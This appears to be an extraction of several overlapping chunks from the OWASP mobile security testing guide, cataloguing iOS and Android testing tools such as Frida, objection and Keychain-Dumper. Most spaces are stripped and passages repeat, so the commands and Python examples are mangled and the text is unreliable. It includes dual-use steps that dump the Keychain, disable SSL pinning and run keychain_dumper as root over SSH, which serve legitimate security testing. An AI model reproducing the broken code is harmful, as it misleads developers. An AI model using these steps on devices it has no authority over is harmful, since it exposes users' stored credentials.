toolchainthatincorporatestherequiredsettings. Tosetupastandalonetoolchain,downloadthelateststableversionoftheNDK.ExtracttheZIPfile,changeintotheNDK rootdirectory,andrunthefollowingcommand: ./build/tools/make_standalone_toolchain.py --arch arm--api 24--install-dir /tmp/android-7-toolchain ThiscreatesastandalonetoolchainforAndroid7.0(APIlevel24)inthedirectory/tmp/android-7-toolchain. Forcon- venience, you can export an environment variable that points to your toolchain directory, (we’ll be using this in the examples). Runthefollowingcommandoraddittoyour.bash_profileorotherstartupscript: export TOOLCHAIN=/tmp/android-7-toolchain jadx Platform: android Availableat: https://github.com/skylot/jadx jadx(DextoJavaDecompiler)isacommandlineandGUItoolforproducingJavasourcecodefromAndroidDEXandAPK files-https://github.com/skylot/jadx nm - Android Platform: android nm is a tool that displays the name list (symbol table) of the given binary. You can find here more information for the Android(GNU)version. Android-SSL-TrustKiller Platform: android Availableat: https://github.com/iSECPartners/Android-SSL-TrustKiller Android-SSL-TrustKillerisaCydiaSubstrateModuleactingasablackboxtooltobypassSSLcertificatepinningformost applicationsrunningonadevice-https://github.com/iSECPartners/Android-SSL-TrustKiller House Platform: android Availableat: https://github.com/nccgroup/house HouseisaruntimemobileapplicationanalysistoolkitforAndroidapps,developedandmaintainedbytheNCCGroupand iswritteninPython. It’sleveragingarunningFridaserveronarooteddeviceortheFridagadgetinarepackagedAndroidapp. Theintention ofHouseistoallowaneasywayofprototypingFridascriptsviaitsconvenientwebGUI. Theinstallationinstructionsand“how-toguide”ofHousecanbefoundintheReadmeoftheGithubrepo. 542\\nAndroid SDK Platform: android Local Android SDK installations are managed via Android Studio. Create an empty project in Android Studio and select Tools->SDK ManagertoopentheSDKManagerGUI.TheSDK PlatformstabiswhereyouinstallSDKsformultiple APIlevels. RecentAPIlevelsare: • Android11.0(APIlevel30) • Android10.0(APIlevel29) • Android9.0(APIlevel28) • Android8.1(APIlevel27) • Android8.0(APIlevel26) AnoverviewofallAndroidcodenames,theirversionnumberandAPIlevelscanbefoundintheAndroidDeveloperDocu- mentation. InstalledSDKsareonthefollowingpaths: Windows: C:\\Users\\<username>\\AppData\\Local\\Android\\sdk MacOS: /Users/<username>/Library/Android/sdk Note: OnLinux,youneedtochooseanSDKdirectory. /opt,/srv,and/usr/localarecommonchoices. 543\\nsimctl Platform: ios simctlisanXcodetoolthatallowsyoutointeractwithiOSsimulatorsviathecommandlinetoe.g.managesimulators, launchapps,takescreenshotsorcollecttheirlogs. lldb Platform: ios Availableat: https://lldb.llvm.org/ AdebuggerbyApple’sXcodeusedfordebuggingiOSapplications-https://lldb.llvm.org/ Xcode Command Line Tools Platform: ios Availableat: https://developer.apple.com/download/more/ AfterinstallingXcode,inordertomakealldevelopmenttoolsavailablesystemwide,itisrecommendedtoinstalltheXcode CommandLineToolspackage. ThiswillbehandyduringtestingofiOSappsassomeofthetools(e.g.objection)arealso relyingontheavailabilityofthispackage. YoucandownloaditfromtheofficialApplewebsiteorinstallitstraightaway fromyourterminal: xcode-select --install class-dump-dyld Platform: ios Availableat: https://github.com/limneos/classdump-dyld class-dump-dyldbyEliasLimneosallowssymbolstobedumpedandretrieveddirectlyfromthesharedcache,eliminating thenecessityofextractingthefilesfirst. Itcangenerateheaderfilesfromappbinaries,libraries,frameworks,bundles, orthewholedyld_shared_cache. Directoriesortheentiretyofdyld_shared_cachecanberecursivelymass-dumped. Frida for iOS Platform: ios Availableat: https://github.com/frida/frida FridasupportsinteractionwiththeObjective-CruntimethroughtheObjCAPI.You’llbeabletohookandcallbothObjective- C and native functions inside the process and its native libraries. Your JavaScript snippets have full access to memory, e.g.toreadand/orwriteanystructureddata. HerearesometasksthatFridaAPIsoffersandarerelevantorexclusiveoniOS: • InstantiateObjective-Cobjectsandcallstaticandnon-staticclassmethods(ObjCAPI). • TraceObjective-Cmethodcallsand/orreplacetheirimplementations(InterceptorAPI). • Enumerateliveinstancesofspecificclassesbyscanningtheheap(ObjCAPI). • Scanprocessmemoryforoccurrencesofastring(MemoryAPI). • Interceptnativefunctioncallstorunyourowncodeatfunctionentryandexit(InterceptorAPI). 544\\nRememberthatoniOS,youcanalsobenefitfromthebuilt-intoolsprovidedwheninstallingFrida,whichincludetheFrida CLI(frida),frida-ps,frida-ls-devicesandfrida-trace,tonameafew. There’safrida-tracefeatureexclusiveoniOSworthhighlighting: tracingObjective-CAPIsusingthe-mflagandwild- cards. Forexample, tracingallmethodsincluding“HTTP”intheirnameandbelongingtoanyclasswhosenamestarts with“NSURL”isaseasyasrunning: frida-trace -UYourApp -m\"*[NSURL**HTTP*]\" ForaquickstartyoucangothroughtheiOSexamples. Installing Frida on iOS ToconnectFridatoaniOSapp,youneedawaytoinjecttheFridaruntimeintothatapp. Thisiseasytodoonajailbroken device: justinstallfrida-serverthroughCydia. Onceithasbeeninstalled,theFridaserverwillautomaticallyrunwith rootprivileges,allowingyoutoeasilyinjectcodeintoanyprocess. StartCydiaandaddFrida’srepositorybynavigatingtoManage->Sources->Edit->Addandenteringhttps://build.fr ida.re. YoushouldthenbeabletofindandinstalltheFridapackage. Using Frida on iOS ConnectyourdeviceviaUSBandmakesurethatFridaworksbyrunningthefrida-pscommandandtheflag‘-U’.This shouldreturnthelistofprocessesrunningonthedevice: $frida-ps -U PID Name --- ---------------- 963 Mail 952 Safari 416 BTServer 422 BlueTool 791 CalendarWidget 451 CloudKeychainPro 239 CommCenter 764 ContactsCoreSpot (...) Frida Bindings Inordertoextendthescriptingexperience,FridaoffersbindingstoprogramminglanguagessuchasPython,C,NodeJS, andSwift. TakingPythonasanexample,thefirstthingtonoteisthatnofurtherinstallationstepsarerequired.",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 172
    }
  },
  {
    "text": "-UYourApp -m\"*[NSURL**HTTP*]\" ForaquickstartyoucangothroughtheiOSexamples. Installing Frida on iOS ToconnectFridatoaniOSapp,youneedawaytoinjecttheFridaruntimeintothatapp. Thisiseasytodoonajailbroken device: justinstallfrida-serverthroughCydia. Onceithasbeeninstalled,theFridaserverwillautomaticallyrunwith rootprivileges,allowingyoutoeasilyinjectcodeintoanyprocess. StartCydiaandaddFrida’srepositorybynavigatingtoManage->Sources->Edit->Addandenteringhttps://build.fr ida.re. YoushouldthenbeabletofindandinstalltheFridapackage. Using Frida on iOS ConnectyourdeviceviaUSBandmakesurethatFridaworksbyrunningthefrida-pscommandandtheflag‘-U’.This shouldreturnthelistofprocessesrunningonthedevice: $frida-ps -U PID Name --- ---------------- 963 Mail 952 Safari 416 BTServer 422 BlueTool 791 CalendarWidget 451 CloudKeychainPro 239 CommCenter 764 ContactsCoreSpot (...) Frida Bindings Inordertoextendthescriptingexperience,FridaoffersbindingstoprogramminglanguagessuchasPython,C,NodeJS, andSwift. TakingPythonasanexample,thefirstthingtonoteisthatnofurtherinstallationstepsarerequired. StartyourPython scriptwithimport fridaandyou’rereadytogo. SeethefollowingscriptthatsimplyrunsthepreviousJavaScriptsnip- pet: ##frida_python.py importfrida session =frida.get_usb_device().attach('com.android.chrome') source =\"\"\" Java.perform(function(){ varview=Java.use(\"android.view.View\"); varmethods=view.class.getMethods(); for(vari=0;i<methods.length;i++){ console.log(methods[i].toString()); } }); \"\"\" script =session.create_script(source) script.load() session.detach() 545\\nInthiscase,runningthePythonscript(python3 frida_python.py)hasthesameresultasthepreviousexample: itwill printallmethodsoftheandroid.view.Viewclasstotheterminal. However,youmightwanttoworkwiththatdatafrom Python. Using send instead of console.log will send data in JSON format from JavaScript to Python. Please read the commentsintheexamplebelow: ##python3frida_python_send.py importfrida session =frida.get_usb_device().attach('com.android.chrome') ##1.wewanttostoremethodnamesinsidealist android_view_methods =[] source =\"\"\" Java.perform(function(){ varview=Java.use(\"android.view.View\"); varmethods=view.class.getMethods(); for(vari=0;i<methods.length;i++){ send(methods[i].toString()); } }); \"\"\" script =session.create_script(source) ##2.thisisacallbackfunction,onlymethodnamescontaining\"Text\"willbeappendedtothelist defon_message(message,data): if\"Text\" inmessage['payload']: android_view_methods.append(message['payload']) ##3.wetellthescripttorunourcallbackeachtimeamessageisreceived script.on('message',on_message) script.load() ##4.wedosomethingwiththecollecteddata,inthiscasewejustprintit formethod inandroid_view_methods: print(method) session.detach() Thiseffectivelyfiltersthemethodsandprintsonlytheonescontainingthestring“Text”: $python3frida_python_send.py public boolean android.view.View.canResolveTextAlignment() public boolean android.view.View.canResolveTextDirection() public void android.view.View.setTextAlignment(int) public void android.view.View.setTextDirection(int) public void android.view.View.setTooltipText(java.lang.CharSequence) ... Intheend, itisuptoyoutodecidewherewouldyouliketoworkwiththedata. Sometimesitwillbemoreconvenient todoitfromJavaScriptandinothercasesPythonwillbethebestchoice. Ofcourseyoucanalsosendmessagesfrom Python to JavaScript by using script.post. Refer to the Frida docs for more information about sending and receiving messages. security Platform: ios Availableat: https://ss64.com/osx/security.html securityisamacOScommandtoadministerKeychains,keys,certificatesandtheSecurityframework. SwiftShield Platform: ios Availableat: https://github.com/rockbruno/swiftshield SwiftShieldisatoolthatgeneratesirreversible,encryptednamesforyouriOSproject’sobjects(includingyourPodsand Storyboards). Thisraisesthebarforreverseengineersandwillproducelesshelpfuloutputwhenusingreverseengineering toolssuchasclass-dumpandFrida. 546\\nWarning: SwiftShield irreversibly overwrites all your source files. Ideally, you should have it run only on your CI server,andonreleasebuilds. AsampleSwiftprojectisusedtodemonstratetheusageofSwiftShield. • Checkoutsushi2k/SwiftSecurity. • OpentheprojectinXcodeandmakesurethattheprojectisbuildingsuccessfully(Product/BuildorApple-Key+B). • DownloadthelatestreleaseofSwiftShieldandunzipit. • GotothedirectorywhereyoudownloadedSwiftShieldandcopytheswiftshieldexecutableto/usr/local/bin: cpswiftshield/swiftshield/usr/local/bin/ • InyourterminalgointotheSwiftSecuritydirectory(whichyoucheckedoutinstep1)andexecutethecommand swiftshield(whichyoudownloadedinstep3): $cdSwiftSecurity $swiftshield -automatic -project-root .-automatic-project-file SwiftSecurity.xcodeproj -automatic-project-scheme SwiftSecurity SwiftShield3.4.0 Automaticmode Buildingprojecttogathermodulesandcompilerarguments... --IndexingReverseEngineeringToolsChecker.swift -- FounddeclarationofReverseEngineeringToolsChecker (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC) FounddeclarationofamIReverseEngineered (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC20amIReverseEngineeredSbyFZ) FounddeclarationofcheckDYLD (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC9checkDYLD33_D6FE91E9C9AEC4D13973F8ABFC1AC788LLSbyFZ) FounddeclarationofcheckExistenceOfSuspiciousFiles ↪ (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC31checkExistenceOfSuspiciousFiles33_D6FE91E9C9AEC4D13973F8ABFC1AC788LLSbyFZ) ... SwiftShieldisnowdetectingclassandmethodnamesandisreplacingtheiridentifierwithanencryptedvalue. Intheoriginalsourcecodeyoucanseealltheclassandmethodidentifiers: SwiftShieldwasnowreplacingallofthemwithencryptedvaluesthatleavenotracetotheiroriginalnameorintentionof theclass/method: Afterexecutingswiftshieldanewdirectorywillbecreatedcalledswiftshield-output. Inthisdirectoryanotherdirec- toryiscreatedwithatimestampinthefoldername. ThisdirectorycontainsatextfilecalledconversionMap.txt,that mapstheencryptedstringstotheiroriginalvalues. 547\\n$catconversionMap.txt // //SwiftShieldConversionMap //AutomaticmodeforSwiftSecurity,2020-01-0213.51.03 //Deobfuscatecrashlogs (oranytextfile)byrunning: //swiftshield -deobfuscate CRASH_FILE -deobfuscate_map THIS_FILE // ViewController===>hTOUoUmUcEZUqhVHRrjrMUnYqbdqWByU viewDidLoad===>DLaNRaFbfmdTDuJCPFXrGhsWhoQyKLnO sceneDidBecomeActive===>SUANAnWpkyaIWlGUqwXitCoQSYeVilGe AppDelegate===>KftEWsJcctNEmGuvwZGPbusIxEFOVcIb Deny_Debugger===>lKEITOpOvLWCFgSCKZdUtpuqiwlvxSjx Button_Emulator===>akcVscrZFdBBYqYrcmhhyXAevNdXOKeG Thisisneededfordeobfuscatingencryptedcrashlogs. AnotherexampleprojectisavailableinSwiftShield’sGithubrepo,thatcanbeusedtotesttheexecutionofSwiftShield. MachoOView Platform: ios Availableat: https://sourceforge.net/projects/machoview/ MachoOViewisausefulvisualMach-Ofilebrowserthatalsoallowsin-fileeditingofARMbinaries. Usbmuxd Platform: ios Availableat: https://github.com/libimobiledevice/usbmuxd usbmuxdisasocketdaemonthatmonitorsUSBiPhoneconnections. Youcanuseittomapthemobiledevice’slocalhost listeningsocketstoTCPportsonyourhostcomputer. ThisallowsyoutoconvenientlySSHintoyouriOSdevicewithout settingupanactualnetworkconnection. WhenusbmuxddetectsaniPhonerunninginnormalmode,itconnectstothe phoneandbeginsrelayingrequeststhatitreceivesvia/var/run/usbmuxd. Xcode Platform: ios Availableat: https://developer.apple.com/xcode/ide/ XcodeisanIntegratedDevelopmentEnvironment(IDE)formacOSthatcontainsasuiteoftoolsfordevelopingsoftware formacOS,iOS,watchOS,andtvOS.YoucandownloadXcodeforfreefromtheofficialApplewebsite. Xcodewillofferyou differenttoolsandfunctionstointeractwithaniOSdevicethatcanbehelpfulduringapenetrationtest,suchasanalyzing logsorsideloadingofapps. Frida-ios-dump Platform: ios Availableat: https://github.com/AloneMonkey/frida-ios-dump Frida-ios-dump is a Python script that helps you retrieve the decrypted version of an iOS app (IPA) from an iOS device. ItsupportsbothPython2andPython3andrequiresFridarunningonyouriOSdevice(jailbrokenornot). Thistooluses Frida’sMemoryAPItodumpthememoryoftherunningappandrecreateanIPAfile. Becausethecodeisextractedfrom memory,itisautomaticallydecrypted. 548\\ngdb Platform: ios Availableat: https://cydia.radare.org/pool/main/g/gdb/ AtooltoperformruntimeanalysisofiOSapplications-https://cydia.radare.org/pool/main/g/gdb/ radare2 for iOS Platform: ios Availableat: https://github.com/radare/radare2 Radare2 is a complete framework for reverse-engineering and analyzing binaries. The installation instructions can be foundintheGitHubrepository. Tolearnmoreonradare2youmaywanttoreadtheofficialradare2book. Learnmore: • r2wiki • LoadingiOSbinariestoradare2 • GitHubradare2Docs-iOS Frida-cycript Platform: ios Availableat: https://github.com/nowsecure/frida-cycript AforkofCycriptincludingabrandnewruntimecalledMjølnerpoweredbyFrida. Thisenablesfrida-cycripttorunonall theplatformsandarchitecturesmaintainedbyfrida-core-https://github.com/nowsecure/frida-cycript iProxy Platform: ios Availableat: https://github.com/tcurdt/iProxy AtoolusedtoconnectviaSSHtoajailbrokeniPhoneviaUSB-https://github.com/tcurdt/iProxy nm - iOS Platform: ios Availableat: http://www.manpagez.com/man/1/nm/osx-10.12.6.php nm is a tool that displays the name list (symbol table) of the given binary. You can find here more information for for iOS. SSL Kill Switch 2 Platform: ios Availableat: https://github.com/nabla-c0d3/ssl-kill-switch2 Blackbox tool to disable SSL certificate validation - including certificate pinning - within iOS and macOS Apps - https: //github.com/nabla-c0d3/ssl-kill-switch2 549\\nios-deploy Platform: ios Availableat: https://github.com/ios-control/ios-deploy Withios-deployyoucaninstallanddebugiOSappsfromthecommandline,withoutusingXcode. Itcanbeinstalledvia brewonmacOS: brewinstallios-deploy Alternatively: gitclonehttps://github.com/ios-control/ios-deploy.git cdios-deploy/ xcodebuild cdbuild/Release ./ios-deploy ln-s<your-path-to-ios-deploy>/build/Release/ios-deploy/usr/local/bin/ios-deploy Thelastlinecreatesasymboliclinkandmakestheexecutableavailablesystem-wide. Reloadyourshelltomakethenew commandsavailable: zsh: #.~/.zshrc bash: #.~/.bashrc iOSbackup Platform: ios Availableat: https://github.com/avibrazil/iOSbackup iOSbackupisaPython3classthatreadsandextractsfilesfromapassword-encryptediOSbackupcreatedbyiTuneson MacandWindows. MobSF for iOS Platform: ios Availableat: https://github.com/MobSF/Mobile-Security-Framework-MobSF ByrunningMobSFlocallyonamacOShostyou’llbenefitfromaslightlybetterclass-dumpoutput. OnceyouhaveMobSFupandrunningyoucanopenitinyourbrowserbynavigatingtohttp://127.0.0.1:8000. Simply dragtheIPAyouwanttoanalyzeintotheuploadareaandMobSFwillstartitsjob. AfterMobSFisdonewithitsanalysis,youwillreceiveaone-pageoverviewofalltheteststhatwereexecuted. Thepage issplitupintomultiplesectionsgivingsomefirsthintsontheattacksurfaceoftheapplication. 550\\nThefollowingisdisplayed: • Basicinformationabouttheappanditsbinaryfile. • Someoptionsto: – ViewtheInfo.plistfile. – Viewthestringscontainedintheappbinary. – Download a class-dump, if the app",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 173
    }
  },
  {
    "text": "gitclonehttps://github.com/ios-control/ios-deploy.git cdios-deploy/ xcodebuild cdbuild/Release ./ios-deploy ln-s<your-path-to-ios-deploy>/build/Release/ios-deploy/usr/local/bin/ios-deploy Thelastlinecreatesasymboliclinkandmakestheexecutableavailablesystem-wide. Reloadyourshelltomakethenew commandsavailable: zsh: #.~/.zshrc bash: #.~/.bashrc iOSbackup Platform: ios Availableat: https://github.com/avibrazil/iOSbackup iOSbackupisaPython3classthatreadsandextractsfilesfromapassword-encryptediOSbackupcreatedbyiTuneson MacandWindows. MobSF for iOS Platform: ios Availableat: https://github.com/MobSF/Mobile-Security-Framework-MobSF ByrunningMobSFlocallyonamacOShostyou’llbenefitfromaslightlybetterclass-dumpoutput. OnceyouhaveMobSFupandrunningyoucanopenitinyourbrowserbynavigatingtohttp://127.0.0.1:8000. Simply dragtheIPAyouwanttoanalyzeintotheuploadareaandMobSFwillstartitsjob. AfterMobSFisdonewithitsanalysis,youwillreceiveaone-pageoverviewofalltheteststhatwereexecuted. Thepage issplitupintomultiplesectionsgivingsomefirsthintsontheattacksurfaceoftheapplication. 550\\nThefollowingisdisplayed: • Basicinformationabouttheappanditsbinaryfile. • Someoptionsto: – ViewtheInfo.plistfile. – Viewthestringscontainedintheappbinary. – Download a class-dump, if the app was written in Objective-C; if it is written in Swift no class-dump can be created. • ListallPurposeStringsextractedfromtheInfo.plistwhichgivesomehintsontheapp’spermissions. • ExceptionsintheAppTransportSecurity(ATS)configurationwillbelisted. • Abriefbinaryanalysisshowingiffreebinarysecurityfeaturesareactivatedore.g.ifthebinarymakesuseofbanned APIs. • ListoflibrariesusedbytheappbinaryandlistofallfilesinsidetheunzippedIPA. IncontrasttotheAndroidusecase,MobSFdoesnotofferanydynamicanalysisfeaturesforiOSapps. RefertoMobSFdocumentationformoredetails. class-dump Platform: ios Availableat: http://stevenygard.com/projects/class-dump/ class-dumpbySteveNygardisacommandlineutilityforexaminingtheObjective-CruntimeinformationstoredinMach-O (Machobject)files. Itgeneratesdeclarationsfortheclasses,categories,andprotocols. Sileo Platform: ios Availableat: https://cydia-app.com/sileo/ SinceiOS11jailbreaksareintroducingSileo,whichisanewjailbreakapp-storeforiOSdevices. ThejailbreakChimerafor iOS12isalsorelyingonSileoasapackagemanager. 551\\nCydia Platform: ios Availableat: https://cydia.saurik.com/ CydiaisanalternativeappstoredevelopedbyJayFreeman(aka“saurik”)forjailbrokendevices. Itprovidesagraphical user interface and a version of the Advanced Packaging Tool (APT). You can easily access many “unsanctioned” app packagesthroughCydia. MostjailbreaksinstallCydiaautomatically. Many tools on a jailbroken device can be installed by using Cydia, which is the unofficial AppStore for iOS devices and allowsyoutomanagerepositories. InCydiayoushouldadd(ifnotalreadydonebydefault)thefollowingrepositoriesby navigatingtoSources->Edit,thenclickingAddinthetopleft: • http://apt.thebigboss.org/repofiles/cydia/: OneofthemostpopularrepositoriesisBigBoss,whichcontainsvarious packages,suchastheBigBossRecommendedToolspackage. • https://cydia.akemi.ai/: Add“Karen’sRepo”togettheAppSyncpackage. • https://build.frida.re: InstallFridabyaddingtherepositorytoCydia. • https://repo.chariz.io: UsefulwhenmanagingyourjailbreakoniOS11. • https://apt.bingner.com/: Anotherrepository,withquietafewgoodtools,isElucubratus,whichgetsinstalledwhen youinstallCydiaoniOS12usingUnc0ver. IncaseyouareusingtheSileoAppStore,pleasekeepinmindthattheSileoCompatibilityLayersharesyoursources betweenCydiaandSileo,however,CydiaisunabletoremovesourcesaddedinSileo,andSileoisunabletoremove sourcesaddedinCydia. Keepthisinmindwhenyou’retryingtoremovesources. AfteraddingallthesuggestedrepositoriesaboveyoucaninstallthefollowingusefulpackagesfromCydiatogetstarted: • adv-cmds: Advancedcommandline,whichincludestoolssuchasfinger,fingerd,last,lsvfs,md,andps. • AppList: Allowsdeveloperstoquerythelistofinstalledappsandprovidesapreferencepanebasedonthelist. • Apt: AdvancedPackageTool,whichyoucanusetomanagetheinstalledpackagessimilarlytoDPKG,butinamore friendlyway. Thisallowsyoutoinstall,uninstall,upgrade,anddowngradepackagesfromyourCydiarepositories. ComesfromElucubratus. • AppSyncUnified: AllowsyoutosyncandinstallunsignediOSapplications. • BigBossRecommendedTools: InstallsmanyusefulcommandlinetoolsforsecuritytestingincludingstandardUnix utilitiesthataremissingfromiOS,includingwget,unrar,less,andsqlite3client. • class-dump: A command line tool for examining the Objective-C runtime information stored in Mach-O files and generatingheaderfileswithclassinterfaces. • class-dump-z: AcommandlinetoolforexaminingtheSwiftruntimeinformationstoredinMach-Ofilesandgener- atingheaderfileswithclassinterfaces. ThisisnotavailableviaCydia,thereforepleaserefertoinstallationstepsin ordertogetclass-dump-zrunningonyouriOSdevice. Notethatclass-dump-zisnotmaintainedanddoesnotwork wellwithSwift. Itisrecommendedtousedsdumpinstead. • Clutch: Usedtodecryptanappexecutable. • Cycript: Is an inlining, optimizing, Cycript-to-JavaScript compiler and immediate-mode console environment that canbeinjectedintorunningprocesses(associatedtoSubstrate). • CydiaSubstrate: Aplatformthatmakesdevelopingthird-partyiOSadd-onseasierviadynamicappmanipulation orintrospection. • cURL:Isawellknownhttpclientwhichyoucanusetodownloadpackagesfastertoyourdevice. Thiscanbeagreat helpwhenyouneedtoinstalldifferentversionsofFrida-serveronyourdeviceforinstance. • DarwinCCTools: Ausefulsetoftoolslikenm,andstripthatarecapableofauditingmach-ofiles. • IPAInstallerConsole: ToolforinstallingIPAapplicationpackagesfromthecommandline. Afterinstallingtwocom- mandswillbeavailableinstallipaandipainstallerwhichareboththesame. • Frida: Anappyoucanusefordynamicinstrumentation. PleasenotethatFridahaschangeditsimplementationof itsAPIsovertime,whichmeansthatsomescriptsmightonlyworkwithspecificversionsoftheFrida-server(which forces you to update/downgrade the version also on macOS). Running Frida Server installed via APT or Cydia is recommended. Upgrading/downgradingafterwardscanbedone,byfollowingtheinstructionsofthisGithubissue. • Grep: Handytooltofilterlines. • Gzip: AwellknownZIPutility. • PreferenceLoader: ASubstrate-basedutilitythatallowsdeveloperstoaddentriestotheSettingsapplication,similar totheSettingsBundlesthatAppStoreappsuse. 552\\n• SOcketCAT:autilitywithwhichyoucanconnecttosocketstoreadandwritemessages. Thiscancomeinhandyif youwanttotracethesyslogoniOS12devices. BesidesCydiayoucanalsosshintoyouriOSdeviceandyoucaninstallthepackagesdirectlyviaapt-get,likeforexample adv-cmds. apt-getupdate apt-getinstalladv-cmds class-dump-z Platform: ios Availableat: https://code.google.com/archive/p/networkpx/wikis/class_dump_z.wiki class-dump-zisclass-dumpre-writtenfromscratchinC++,avoidingtheuseofdynamiccalls. Removingtheseunneces- sarycallsmakesclass-dump-znearly10timesfasterthanitspredecessor. Plutil Platform: ios Availableat: https://www.theiphonewiki.com/wiki/Plutil Aprogramthatcanconvert.plistfilesbetweenabinaryversionandanXMLversion-https://www.theiphonewiki.com/wi ki/Plutil otool Platform: ios Availableat: http://www.manpagez.com/man/1/otool/ otoolisatoolfordisplayingspecificpartsofobjectfilesorlibraries. ItworkswithMach-Ofilesanduniversalfileformats. BinaryCookieReader Platform: ios Availableat: https://github.com/as0ler/BinaryCookieReader AtooltodumpallthecookiesfromthebinaryCookies.binarycookiesfile-https://github.com/as0ler/BinaryCookieReader /blob/master/BinaryCookieReader.py objection for iOS Platform: ios Availableat: https://github.com/sensepost/objection ObjectionoffersseveralfeaturesspecifictoiOS.Youcanfindthefulllistoffeaturesontheproject’spage,butherearea fewinterestingones: • RepackageapplicationstoincludetheFridagadget • DisableSSLpinningforpopularmethods 553\\n• Accessapplicationstoragetodownloadoruploadfiles • ExecutecustomFridascripts • DumptheKeychain • Readplistfiles Allthesetasksandmorecanbeeasilydonebyusingthecommandsinobjection’sREPL.Forexample,youcanobtainthe classesusedinanapp,functionsofclassesorinformationaboutthebundlesofanappbyrunning: OWASP.iGoat-Swifton (iPhone:12.0)[usb] #ioshookinglistclasses OWASP.iGoat-Swifton (iPhone:12.0)[usb] #ioshookinglistclass_methods<ClassName> OWASP.iGoat-Swifton (iPhone:12.0)[usb] #iosbundleslist_bundles If you have a jailbroken device with frida-server installed, Objection can connect directly to the running Frida server to provideallitsfunctionalitywithoutneedingtorepackagetheapplication. However,itisnotalwayspossibletojailbreak thelatestversionofiOS,oryoumayhaveanapplicationwithadvancedjailbreakdetectionmechanisms. Theabilitytoperformadvanceddynamicanalysisonnon-jailbrokendevicesisoneofthefeaturesthatmakesOb- jectionincrediblyuseful. Afterfollowingtherepackagingprocessyouwillbeabletorunalltheaforementionedcommands whichmakeitveryeasytoquicklyanalyzeanapplication,orgetaroundbasicsecuritycontrols. Using Objection on iOS StartingupObjectiondependsonwhetheryou’vepatchedtheIPAorwhetheryouareusingajailbrokendevicerunning Frida-server. ForrunningapatchedIPA,objectionwillautomaticallyfindanyattacheddevicesandsearchforalistening Frida gadget. However, when using frida-server, you need to explicitly tell frida-server which application you want to analyze. ##ConnectingtoapatchedIPA $objectionexplore ##Usingfrida-pstogetthecorrectapplicationname $frida-ps -Ua|grep -iTelegram 983 Telegram ##ConnectingtotheTelegramappthroughFrida-server $objection --gadget=\"Telegram\" explore OnceyouareintheObjectionREPL,youcanexecuteanyoftheavailablecommands. Belowisanoverviewofsomeof themostusefulones: ##Showthedifferentstoragelocationsbelongingtotheapp $env ##Disablepopularsslpinningmethods $iossslpinningdisable ##DumptheKeychain $ioskeychaindump ##DumptheKeychain,includingaccessmodifiers.Theresultwillbewrittentothehostinmyfile.json $ioskeychaindump --json <myfile.json> ##Showthecontentofaplistfile $iosplistcat <myfile.plist> MoreinformationonusingtheObjectionREPLcanbefoundontheObjectionWiki swift-demangle Platform: ios swift-demangleisanXcodetoolthatdemanglesSwiftsymbols. Formoreinformationrunxcrun swift-demangle -help onceinstalled. 554\\nKeychain-Dumper Platform: ios Availableat: https://github.com/mechanico/Keychain-Dumper Keychain-dumperisaniOStooltocheckwhichkeychainitemsareavailabletoanattackeronceaniOSdevicehasbeen jailbroken. TheeasiestwaytogetthetoolistodownloadthebinaryfromitsGitHubrepoandrunitfromyourdevice: $gitclonehttps://github.com/ptoomey3/Keychain-Dumper $scp -P2222Keychain-Dumper/keychain_dumperroot@localhost:/tmp/ $ssh -p2222root@localhost iPhone:~root#chmod+x/tmp/keychain_dumper iPhone:~root#/tmp/keychain_dumper ForusageinstructionspleaserefertotheKeychain-dumperGitHubpage. Grapefruit Platform: ios Availableat: https://github.com/ChiChou/grapefruit GrapefruitisaniOSappassessmenttoolthatisusingtheFridaserverontheiOSdeviceandisabstractingmanypene- trationtestingtasksintoaWebUI.Itcanbeinstalledvianpm. $npminstall -gigf $grapefruit listeningonhttp://localhost:31337 Whenyouexecutethecommandgrapefruitalocalserverwillbestartedonport31337. Connectyourjailbrokendevice withtheFridaserverrunning,oranon-jailbrokendevicewitharepackagedappincludingFridatoyourmachineviaUSB. Onceyouclickonthe“iPhone”iconyouwillgetanoverviewofallinstalledapps. With Grapfruit it’s possible to explore different kinds of information concerning an iOS app. Once you selected the iOS appyoucanperformmanytaskssuchas: • Getinformationaboutthebinary • Viewfoldersandfilesusedbytheapplicationanddownloadthem • InspecttheInfo.plist • GetaUIDumpoftheappscreenshownontheiOSdevice • Listthemodulesthatareloadedbytheapp • Dumpclassnames •",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 174
    }
  },
  {
    "text": "iPhone:~root#/tmp/keychain_dumper ForusageinstructionspleaserefertotheKeychain-dumperGitHubpage. Grapefruit Platform: ios Availableat: https://github.com/ChiChou/grapefruit GrapefruitisaniOSappassessmenttoolthatisusingtheFridaserverontheiOSdeviceandisabstractingmanypene- trationtestingtasksintoaWebUI.Itcanbeinstalledvianpm. $npminstall -gigf $grapefruit listeningonhttp://localhost:31337 Whenyouexecutethecommandgrapefruitalocalserverwillbestartedonport31337. Connectyourjailbrokendevice withtheFridaserverrunning,oranon-jailbrokendevicewitharepackagedappincludingFridatoyourmachineviaUSB. Onceyouclickonthe“iPhone”iconyouwillgetanoverviewofallinstalledapps. With Grapfruit it’s possible to explore different kinds of information concerning an iOS app. Once you selected the iOS appyoucanperformmanytaskssuchas: • Getinformationaboutthebinary • Viewfoldersandfilesusedbytheapplicationanddownloadthem • InspecttheInfo.plist • GetaUIDumpoftheappscreenshownontheiOSdevice • Listthemodulesthatareloadedbytheapp • Dumpclassnames • Dumpkeychainitems Cycript Platform: ios Availableat: https://www.cycript.org/ CydiaSubstrate(formerlycalledMobileSubstrate)isthestandardframeworkfordevelopingCydiaruntimepatches(the so-called“CydiaSubstrateExtensions”)oniOS.ItcomeswithCynject,atoolthatprovidescodeinjectionsupportforC. Cycript is a scripting language developed by Jay Freeman (aka Saurik). It injects a JavaScriptCore VM into a running process. Via the Cycript interactive console, users can then manipulate the process with a hybrid Objective-C++ and JavaScriptsyntax. AccessingandinstantiatingObjective-Cclassesinsidearunningprocessisalsopossible. InordertoinstallCycript,firstdownload,unpack,andinstalltheSDK. 555\\n##oniphone $wgethttps://cydia.saurik.com/api/latest/3 -Ocycript.zip && unzip cycript.zip $sudocp -aCycript.lib/*.dylib/usr/lib $sudocp -aCycript.lib/cycript-apl/usr/bin/cycript 